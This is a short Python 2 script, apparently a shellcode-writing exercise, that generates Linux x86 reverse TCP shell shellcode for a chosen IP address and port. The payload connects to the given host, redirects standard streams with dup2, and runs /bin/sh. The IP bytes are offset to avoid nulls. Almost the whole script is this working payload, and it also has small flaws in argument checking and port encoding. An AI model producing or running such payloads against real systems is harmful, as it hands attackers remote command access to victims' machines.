#!/usr/bin/python

import sys,socket

if len(sys.argv) != 3:
	print "Fail!"

ipbts           = bytearray(socket.inet_aton(sys.argv[1]))
incremented     = [b+1 for b in ipbts]
ip              = "".join(["\\x" + format(b, 'x') for b in incremented])
port_number     = int(sys.argv[2])
bts             = [port_number >> i & 0xff for i in (24,16,8,0)]
filtered        = [b for b in bts if b > 0]
formatted       = ["\\x" + format(b, 'x') for b in filtered]
port            = "".join(formatted)

shellcode ="\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x31\\xc9\\x51\\x53\\x6a\\x02\\x89\\xe1"
shellcode+="\\xcd\\x80\\x31\\xff\\x89\\xc7\\x31\\xc0\\xb0\\x66\\x31\\xc9\\xb9"
print("Ip is: ")
print(ip)
shellcode+= ip # "\\x80\\x01\\x01\\x02"
shellcode+="\\x81\\xe9\\x01\\x01\\x01\\x01\\x51\\x66\\x68"
print("Port is: ")
print(port)
shellcode+= port
shellcode+="\\x43\\x66\\x53\\x89"
shellcode+="\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\x43\\xcd\\x80\\x31\\xc9\\xb1\\x02\\x31\\xc0"
shellcode+="\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\\x31\\xdb\\x53\\x68\\x2f"
shellcode+="\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80";

print(shellcode)
